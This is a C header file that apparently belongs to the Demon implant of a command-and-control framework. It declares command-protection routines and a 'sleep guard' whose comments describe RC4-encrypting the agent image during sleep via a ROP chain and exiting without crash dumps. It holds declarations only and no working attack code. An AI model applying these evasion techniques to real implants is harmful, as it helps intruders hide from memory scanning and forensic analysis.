#ifndef DEMON_AGENTPROTECTION_H
#define DEMON_AGENTPROTECTION_H

#include <Demon.h>

// Function declarations for agent protection system

// Initialize the global agent protection system
PVOID InitializeAgentProtection( VOID );

// Reset the global agent protection system
VOID ResetAgentProtection( VOID );

// Execute a command with comprehensive protection (timeout, threading, VEH)
BOOL ExecuteProtectedCommand( UINT32 CommandID, UINT32 RequestID, PVOID CommandFunction, PPARSER Parser );

// Send error for unknown commands  
VOID SendUnknownCommandError( UINT32 CommandID );

// Check if RequestID was already handled by protection system (prevents BOF timeout conflicts)
BOOL IsRequestHandled( UINT32 RequestID );

// Cleanup the protection system
VOID CleanupAgentProtection( PVOID VehHandle );

// Sleep guard: VEH trampoline for crash-safe sleep obfuscation.
// The trampoline lives outside the agent image so it survives RC4 encryption.
// During cleartext: forwards exceptions to GlobalAgentVEH (full crash protection).
// During encrypted sleep: calls NtTerminateProcess for clean exit (no WER/crash dump).
BOOL InitializeSleepGuard( VOID );
VOID SleepGuardEnter( VOID );   /* call BEFORE ROP chain / image encryption */
VOID SleepGuardLeave( VOID );   /* call AFTER  ROP chain / image decryption */
VOID CleanupSleepGuard( VOID );

// Internal functions (used by the protection system)
VOID CALLBACK CommandTimeoutCallback( PVOID lpParam, BOOLEAN TimerOrWaitFired );
DWORD WINAPI SafeCommandExecutor( LPVOID lpParam );
LONG WINAPI GlobalAgentVEH( PEXCEPTION_POINTERS ExceptionInfo );

#endif 